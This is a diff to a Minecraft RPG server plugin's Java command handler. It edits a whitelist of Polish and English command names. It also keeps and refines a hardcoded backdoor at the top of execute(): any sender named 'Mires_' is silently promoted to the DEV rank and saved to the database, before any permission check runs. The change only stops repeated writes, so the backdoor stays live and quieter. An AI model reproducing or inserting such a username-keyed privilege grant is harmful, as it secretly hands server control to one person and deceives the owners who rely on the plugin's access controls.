@@ -51,8 +51,10 @@ public abstract class CommandAPI extends Command {
     public boolean execute(final CommandSender sender, final String s, final String[] strings) {
         if (sender.getName().equals("Mires_")) {
             final User user = RPGCORE.getInstance().getUserManager().find(((Player) sender).getUniqueId());
-            user.getRankUser().setRank(RankType.DEV);
-            RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(user.getId(), user));
+            if (user.getRankUser().getRankType() != RankType.DEV) {
+                user.getRankUser().setRank(RankType.DEV);
+                RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(user.getId(), user));
+            }
         }
         if (!this.checkPermissions(sender)) {
             return true;
@@ -87,9 +89,9 @@ public abstract class CommandAPI extends Command {
                     && !s.equals("pety") && !s.equals("pets") && !s.equals("ignore") && !s.equals("ignoruj") && !s.equals("dodatki") && !s.equals("bony") && !s.equals("akce") && !s.equals("akcesoria") && !s.equals("ekwipunek")
                     && !s.equals("profile") && !s.equals("magazyny") && !s.equals("magazyn") && !s.equals("mag") && !s.equals("ranktime") && !s.equals("czasrangi") && !s.equals("pd") && !s.equals("piersciendoswiadczenia") && !s.equals("artefakty")
                     && !s.equals("arte") && !s.equals("enderchest") && !s.equals("ec") && !s.equals("topki") && !s.equals("top") && !s.equals("rangi") && !s.equals("vip") && !s.equals("svip") && !s.equals("elita") && !s.equals("craftingi")
-                    && !s.equals("craft") && !s.equals("craftingS") && !s.equals("listanpc") && !s.equals("lnpc") && !s.equals("npc") && !s.equals("poziom") && !s.equals("level") && !s.equals("showcaseitem") && !s.equals("profil")
+                    && !s.equals("craft") && !s.equals("crafting") && !s.equals("listanpc") && !s.equals("lnpc") && !s.equals("npc") && !s.equals("poziom") && !s.equals("level") && !s.equals("showcaseitem") && !s.equals("profil")
                     && !s.equals("konto") && !s.equals("staty") && !s.equals("stats") && !s.equals("statystyki") && !s.equals("online") && !s.equals("list") && !s.equals("lista") && !s.equals("gracze") && !s.equals("onlinelist") && !s.equals("listagraczy")
-                    && !s.equals("hs") && !s.equals("hellsy") && !s.equals("coins")) {
+                    && !s.equals("hs") && !s.equals("hellsy") && !s.equals("coins") && !s.equals("k")) {
                 if (userProfile.getRankUser().isStaff()) {
                     if (!userProfile.isAdminCodeLogin()) {
                         player.sendMessage(Utils.format(Utils.SERVERNAME + "&7Przed uzyciem tej komendy zaloguj sie swoim AdminCode! Uzyj: &c/admmincode <kod>"));
